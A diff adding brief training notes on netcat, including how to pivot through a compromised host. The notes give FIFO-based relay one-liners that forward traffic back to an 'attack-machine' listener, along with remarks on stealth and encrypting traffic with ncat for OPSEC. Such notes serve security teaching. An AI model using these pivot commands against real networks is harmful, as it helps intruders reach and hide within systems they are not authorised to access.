@@ -1,0 +1,42 @@
+Netcat
+    * Relays its stdin through to a network output port
+    * Relays its netowkr input through to stout
+    * When acting as a listener, it provides a service
+    * When acting as a connector, it is a client of some service elsewhere
+
+Netcat two primary uses
+    * Listener (nc -l -p 4444) Open on a port and listens through stdin 
+    * Connector (nc host2 3333) will try and connect to a listener 
+
+Simple Trivial Netcat Use
+    * Connector to a service on another machine
+    * In this case, connector to the web server on the blue host: nc 204.120.204.253 80
+
+What if a service is not accessible on my network
+    * We can easily use netcat to connect to a service we can reach 
+
+Pivoting with two netcats
+    * If its available to a compromised host with which I can communicate, netcat comes to the rescue
+    * On linux systems, you can make a FIFO in the file system using mknod
+        - mknod name-of-file p
+    * Then two processess can communicate by writing or reading from the file
+    * We can create such a FIFO on a linux host as follows
+        - mknod /tmp/bp p
+    * We can combine a netcat listener and connector as such:
+        - nc host-to-connect 80 </tmp/bp | nc -l -p 444 >/tmp/bp
+
+Blocked Ports
+    * Just as with metasploit exploits, we may  either:
+        - Not be able to open a connection to an arbitrary port on a pivot host
+        - Choose not to open a connection to the pivot host for reasons of stealth
+
+Pivoting using a listener and a connector using filesystem pipe
+    * On Attacker: nc -l -p 1337 
+    * On pivot: nc host-to-contact </tmp/bp | nc attack-machine 1337 >/tmp/bp   OR
+    * On pivot: nc host-to-contact 80 -c "nc attack-machine 1337"
+
+Tradional NC vs NCAT and OPSEC
+    * Traditional nc suffers from exchanging information in clear text. Why do we care?
+    * You can search for implementations of nc (traditional netcat) and ncat (modern netcat) on kali and see the differences (ncat much larger)
+        - ncat --ssl host port
+        - ncat -l -ssl port
